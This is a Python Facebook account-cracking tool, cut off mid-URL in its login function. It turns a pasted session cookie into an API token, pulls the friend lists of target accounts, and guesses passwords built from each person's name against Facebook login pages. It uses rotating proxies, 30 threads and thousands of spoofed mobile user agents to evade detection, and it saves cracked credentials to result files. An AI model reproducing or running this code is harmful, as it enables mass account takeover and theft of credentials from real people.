######## [ AYAM BETINA ] ########
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
######## [ AYAM JANTAN ] ########
pretty.install()
CON=sol()
ugen2=[]
peler=[]
ugen=[]
cokbrut=[]
yakuza=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()

for agenku in range(1000):
	 rr,rc=random.randint,random.choice
	 az1 = str(rc(['PKQ1','QP1A','RP1A','QKQ1','PPR1','SP1A','TP1A','OPM1','RKQ1','SKQ1','TKQ1','UKQ1','01AQKQ1','QQ3A','QD4A','QQ1B']))
	 az2 = (f"{str(rr(5000,299999))}")
	 az3 = str(rc(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020']))
	 kombinasi_build = (f"{az1}.{az2}.{az3}")
	 ua_random = str(rc(['RMX3151','RMX2170','RMX2001','RMX2030','RMX1827','RMX1851','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1945','RMX3063','RMX3201','RMX3263','RMX3191','RMX3197','RMX3265','RMX2020','RMX3581','RMX3690','RMX3501','RMX3627','RMX3511','RMX3830','RMX3760','RMX3710',
	 'CPH1114','CPH1235','CPH2048','CPH2107','CPH2261','CPH2331','CPH2351','CPH2389','CPH2451','CPH2491','CPH2499','CPH2513','CPH2515','CPH2519','CPH2521','CPH2523','CPH2525','CPH2529','CPH2551','CPH2553','CPH2569','CPH2579','CPH2591','CPH2643','CPH6528','CPH7338','CPH2179','CPH2269','CPH2083','PCHM00','CPH2271','CPH2471','CPH1923','CPH1925','CPH2137',
	 'V2118','V2166','V2217','V2221','V2203','V2254','V2168A','vivo 1906','V2028','vivo 1904','V2163A','V2102','vivo 2007','V2026','V2069','vivo 1901','V2134','V2147','V2120','V2204','vivo 1902','vivo 1915','vivo 2015','V2027','V2043','V2054','V2037','V2065','V2032','V2038','V2111','V2149','V2110','V2207','V2206','V2249','V2302','vivo 1938','V2160','V2036','V2068','vivo 1935','V2031',
	 'Infinix X682B','Infinix X688B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6812','Infinix X6817','Infinix X6816C','Infinix X6816D','Infinix X6826B','Infinix X666B','Infinix X6825','Infinix X6827','Infinix X6833B','Infinix X6835','Infinix X625C','Infinix X650C','Infinix X655D','Infinix X680B','Infinix X693','Infinix X695C','Infinix X663','Infinix X697','Infinix X698','Infinix X670','Infinix X663D',
	 'Infinix X676B','Infinix X671B','Infinix X672','Infinix X6819','Infinix X677','Infinix X678B','Infinix X6710','Infinix X6716B','Infinix X652A','Infinix X660B','Infinix X5515F','Infinix X5516C','Infinix X653','Infinix X680D','Infinix X657C','Infinix X6512','Infinix X6823C','Infinix X6517','Infinix X6516','Infinix X6711','Infinix X6821','Infinix X6815D','Infinix X6820','Infinix X6811',
	 '22041219NY','M2004J7BC','23053RN02A','23076RN4BI','2212ARNC4L','M2006C3MNG','M2006C3MG','Redmi K20','Redmi K20 Pro','M2101K6G','M2101K7BNY','Redmi Note 11','2201117TG','21091116AC','2201116TG','21091116UC','2201117SY','22041216C','22031116BG','Redmi Note 13','Redmi Note 7S','Redmi Note 8','Redmi Note 8 Pro','Redmi Note 9','M2007J17C','Redmi Note 9 Pro',
	 'Redmi Y2','Redmi Y3','2206122SC','2206123SC','2211133G','2210132C','Mi 10','M2002J9G','Mi 10 Pro','M2102J2SC','M2011K2C','M2101K9AG','M2102K1AC','MI 8','MI 8 Lite','MI 8 Pro','MI 9','Mi 9 Lite','Mi9 Pro 5G','Mi 9T','Mi A2','Mi A2 Lite','Mi A3','MI A615FN','MI CC 9','MI CC9 Pro','Mi MIX 3 5G','Mi Note 10 Lite','Mi Note 10 Pro','M2105K81C','Redmi 01A',
	 'SM-A015M','SM-A013M','SAMSUNG SM-A022F','SM-A025G','SM-A035M','SM-A032M','SM-A037M','SM-A045F','SM-A042F','SM-A047F','SM-A105M','SM-S102DL','SM-A107M','SM-A115AP','SM-A125U','SM-A135F','SM-A136U','SM-A145R','SM-A146U','SM-A205S','SM-A202F','SM-A207F','SM-A215U','SM-A217F','SM-A225M','SM-A226B','SM-A235M','SM-A236U','SM-A245F','SM-A305FN',
	 'SM-A307GT','SM-A315F','SM-A325F','SM-A326B','SM-A336E','SM-A346B','SM-A430F','SM-A405FN','SM-E236B','SM-S367VL','SM-J400M','SM-J530F','SM-J530G','SM-J600FN','SM-J610F','SM-S767VL','SM-A202K','SM-M015G','SM-M017F','SM-M127F','Galaxy Note20','SM-N950U','SM-N9300','SM-N960F','SM-9005','SM-N981B','SM-N985F','SM-N770F','SM-N970F',
	 'ACTAB1021','ACTAB1022','ACTAB721','ACTAB821','ATAB1021E','ATAB721E','Z555','Z570','A200 Pro','Lenovo L19111','Lenovo L10041','d-42A','Lenovo L39051','Lenovo K10 Note','Lenovo K10','Lenovo K11','Lenovo K11 Power','Lenovo K12','Lenovo K12','Lenovo K14','Lenovo K15','Lenovo L70081','Lenovo L79031','Lenovo L71091','Lenovo TB-9707F','Lenovo L71061','Lenovo TB-J706F','TB132FU',
	 'Lenovo TB-8505XS','A101LV','Lenovo TB-8304F1','Lenovo TB-X6C6F','Lenovo TB-J607Z','Lenovo TB-X505F','TB328FU','Lenovo TB-X605L','Lenovo TB-X606F','Lenovo TB-X605LC','Lenovo TB-X306F','Lenovo TB128XU','Lenovo TB-7305F','Lenovo TB-7306F','Lenovo TB-8505X','Lenovo TB-8506X','TB300XU','Lenovo TB-8705F','Lenovo TB-X705L','Lenovo TB-J606F','TB350XU','Lenovo TB-J616F','Lenovo TB-Q706F',
	 'Lenovo TB-J607F','Lenovo PB-6505Y']))
	 ip1 = str(rc(['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18']))
	 ip2 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	 ip3 = str(rc(['1','2','3','4','5','6','7','8','9','0']))
	 iphone0 = (f"{ip1}_{ip2}_{ip3}")
	 iphone1 = str(rc(["605.1.15","534.5.4","531.48.3","533.17.9","535.50.4","535.29.5","532.9","534.14.7"]))
	 iphone2 = str(rc(["18F72","15E148","11A465","10B350","11A4449d","10B329","7B500","11B554a","13E233","13F69","13E238","9B206","9A334","11B651","11D167","8C148","8K2","7B314","10a523","8C148","8J2","1A543","12A405","8L1","8F190","8C148","8G4","8A293","8B117","19G82","15E148","18F72","20G75"]))
	 iphone3 = str(rc(["604.1","6531.48.3","6533.18.5","6535.50.4","6535.29.5","6531.22.7","605.1"]))
	 i = random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR','en','id','de','ru','en','fr','fa','ja','pt','cs','zh','vi','tr'])
	 oppo = random.choice(["CPH2437","CPH2351","CPH2048","CPH2389","CPH2359","CPH2363","CPH2211","PGX110","CPH1917","PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10",
	 "RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	 heytab = (f"HeyTapBrowser/{str(rr(2,40))}.{str(rr(0,10))}.{str(rr(0,99))}.{str(rr(0,9))}")
	 a = random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	 android = (f"{str(rr(5,14))}")
	 ch = (f"{str(rr(76,119))}.0.{str(rr(3000,10000))}.{str(rr(36,299))}")
	 k1 = (f"{str(rr(10,12))}")
	 k2 = (f"{str(rr(110,117))}.0.{str(rr(5000,5999))}.{str(rr(0,299))}")
	 ua_K = f"Mozilla/5.0 (Linux; Android {k1}; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{k2} Mobile Safari/537.36"
	 ua1 = f'Mozilla/5.0 (Linux; Android {android}; {ua_random} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 ua2 = f'Mozilla/5.0 (Linux; Android {a}; {i}; {ua_random} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 ua3 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone0} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile/{iphone2} Safari/{iphone3}'
	 ua4 = f'Mozilla/5.0 (Linux; Android {android}; {i}; {ua_random} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 ua5 = f'Mozilla/5.0 (Linux; Android {android}; {oppo} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 ua6 = f'Mozilla/5.0 (Linux; Android {a}; {i}; {oppo} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 ua7 = f'Mozilla/5.0 (Linux; Android {android}; {i}; {ua_random} Build/{kombinasi_build} wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch} Mobile Safari/537.36'
	 cobracan = str(rc([ua_K,ua1,ua2,ua4,ua5,ua6,ua7]))
	 ugen.append(cobracan)
######## [ AYAM JANDA ] ########
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
peler=[]
######## [ AYAM MUDA ] ########
def tahun(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		elif fx[:5] in ['10009']           :tahunz = '2023'
		elif fx[:5] in ['61550']           :tahunz = '2023'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
######## [ AYAM TUA ] ########
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
######## [ AYAM BANCI ] ########
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
######## [ AYAM BADUT ] ########
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.05)
def clear():
	os.system('clear')
def back():
	login()
######## [ AYAM BAU ] ########
def lonte():	
	print(f"""{H}
╦ ╦╔═╗╔╗╔╔╦╗╔═╗═╗ ╦
╚╦╝╠═╣║║║ ║║║╣ ╔╩╦╝
 ╩ ╩ ╩╝╚╝═╩╝╚═╝╩ ╚═      {K} Version : {H}V.4
{p}[•• ────────────────────────────────────────── ••]{x}⠀⠀⠀⠀⠀
[ • nama : {H}YANDEX  | {P} status : {H}free {P} ••••••••••••© • ]
{p}[•• ────────────────────────────────────────── ••]{x}⠀⠀⠀⠀⠀""")
######## [ AYAM LONTE ] ########
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			basariheker = requests.get('https://graph.facebook.com/me?fields=id&access_token='+tokenku[0], cookies={'cookie':cok})
			basganteng = json.loads(basariheker.text)['id']
			menu()
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		lonte()
		cok = input('[+] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = sop(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = sop(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); masuk = input('\n[+] tekan enter'); os.system('clear'); menu()
	except Exception as e:
		print(e)
		
		
######## [ AYAM KONTOL ] ########
def menu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[×] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	os.system('clear')
	lonte()
	print(' ')
	print(f'[{H}01{x}] {H}CRACK PUBLIK\n{x}[{H}02{x}] {H}CRACK MASAL\n{x}[{H}03{x}] {H}CEK RESULT\n{x}[{H}04{x}] {M}HAPUS COOKIE{x}')
	AT = input(f'[•] 𝙿𝙸𝙻𝙸𝙷 𝚃𝚘𝚍 : ')
	if AT in ['1','1']:
		nge_krek()
	if AT in ['2','02']:
		nge_crack()
	if AT in ['3','03']:
		result()
	elif AT in ['exit','4','logout']:
	   hapus_cookie =	os.system('rm -rf .token.txt && rm -rf .cok.txt')
	   print(f'[•] SUKSES HAPUS PRAWAN')
###----------[ DUMP ID PUBLIK ]----------###
def nge_krek():
	with requests.Session() as ses:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input(f'[•] 𝙼𝙰𝚂𝚄𝙺𝙰𝙽 𝙸𝙳 : ')
		try:
			params = {
			"access_token": token, 
			"fields": "name,friends.fields(id,name,birthday)"
			}
			b = ses.get("https://graph.facebook.com/{}".format(a),params = params,cookies = {'cookie': cok}).json()
			for c in b["friends"]["data"]:
				id.append(c["id"]+"|"+c["name"])
			print('[•] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : {}'.format(len(id)))
			setting()
		except Exception as e:
			print(e)

######## [ AYAM MEMEK ] ########
def nge_crack():    
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
	    exit()
	try:
		print('  •|•  How many ID,and enter the public ID  •|•')
		print(f'{P}[•• ────────────────────────────────────────── ••]')
		kumpulkan = int(input(f'[•] MAU BERAPA ID : '))
		print(f'{P}[•• ────────────────────────────────────────── ••]')
	except ValueError:
	    exit()
	if kumpulkan<1 or kumpulkan>1000:
	    exit()
	ses=requests.Session()
	bilangan = 0
	for KOTG49H in range(kumpulkan):
		bilangan+=1
		Masukan = input(f'[•] MASUKAN ID YANG KE  '+str(bilangan)+f' : ')
		uid.append(Masukan)
		print(f'{P}[•• ────────────────────────────────────────── ••]')
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
	      print('[∆] 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳 𝚈𝙰𝙽𝙶 𝚃𝙴𝚁𝙺𝚄𝙼𝙿𝚄𝙻 : '+str(len(id))) 
	      setting() 
	except Exception as e:
	    print(e) 
	    exit()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'[{b}01{x}] {H}Hasil OK\n{x}[{b}02] {K}Hasil CP\n{x}[03] Kembali')
	kz = input(f'╰─ Pilih : ')
	if kz in ['2','02']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Bro ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Bro ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{h}{cpkuni[2]}{x}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Bro ')
		exit()
######## [ AYAM MERAH ] ########
def setting ():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('>> Pilih Yang Bener Kontooll ')
		exit()
	print(f'[{b}01{x}] {H}VALIDATE\n{x}[{b}02{x}] {H}ASYNC{x}')
	hc = input(f'[•] PILIH : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	#elif hc in ['3','03']:
		#method.append('touch')
	#elif hc in ['4','04']:
		#method.append('mbasic')
	else:
		method.append('mobile')

	print(f'{H}[•• ────────────────────────────────────────── ••]')
	pwplus=input(f'{P}[•] Pw Tambahan? [ y/t ] : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(f'[•] Pw : {K}')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
######## [ AYAM KUNING ] ########
def passwrd():
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	print(f'{H}          MAINKAN MODPES SETIAP 500 ID{P}')
	print(f'{P}[•• ────────────────────────────────────────── ••]')
	with tred(max_workers=30) as pool:
		for anim in id2:
			idf,nmf = anim.split('|')[0],anim.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'01')
					pwv.append(frs+'02')
					pwv.append(frs+'12')
					pwv.append(frs+'321')
					pwv.append(frs+'05')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			#elif 'touch' in method:
				#pool.submit(cracktouch,idf,pwv)
			#elif 'mbasic' in method:
				#pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print(f'{M} ──────────────────────────────────────────{x}')
	print(f'[•]{h} OK : {h}%s '%(ok))
	print(f'[•]{k} CP : {k}%s '%(cp))
	print(f'{M} ──────────────────────────────────────────{x}')
	print('[•] type (y) to exit  ')
	woi = input('[•] chose : ')
	if woi in ['y','Y']:
		back()
	else:
		print(f'\t{x}>>{k} Good Bye Dadaahh{x} << ')
		time.sleep(2)
		exit()
######## [ AYAM JAGO ] ########
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice(['🤡','🗿','😫'])
	sys.stdout.write(f"\r[{bo}] {P}[{P}{loop}{P}/{P}{len(id)}{P}]/{P}[{H}{ok}{P}]/{P}[{K}{cp}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			url = random.choice(['m.prod.facebook.com','mbasic.facebook.com','free.facebook.com','x.facebook.com'])
			ses.headers.update({
            'Host': url,
            'cache-control': 'max-age=0',
            'sec-ch-ua-mobile': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
            })
			p = ses.get(f'https://'+url+'/login.php?skip_api_login=1&api_key=957549474255294&kid_directed_site=0&app_id=957549474255294&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D957549474255294%26cbt%3D1701149946772%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df16ca8a297d92d4%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%26client_id%3D957549474255294%26display%3Dtouch%26domain%3Dshopee.co.id%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fshopee.co.id%252Fbuyer%252Flogin%253Ffrom%253D%25252F%2526next%253D%25252F%26locale%3Den_US%26logger_id%3Df1a0326eb8ef6a4%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df4132f483d7f18%2526domain%253Dshopee.co.id%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fshopee.co.id%25252Ff294ef620828698%2526relation%253Dopener%2526frame%253Df15caec7a8001dc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26refsrc%3Ddeprecated%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df4132f483d7f18%26domain%3Dshopee.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fshopee.co.id%252Ff294ef620828698%26relation%3Dopener%26frame%3Df15caec7a8001dc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=depreca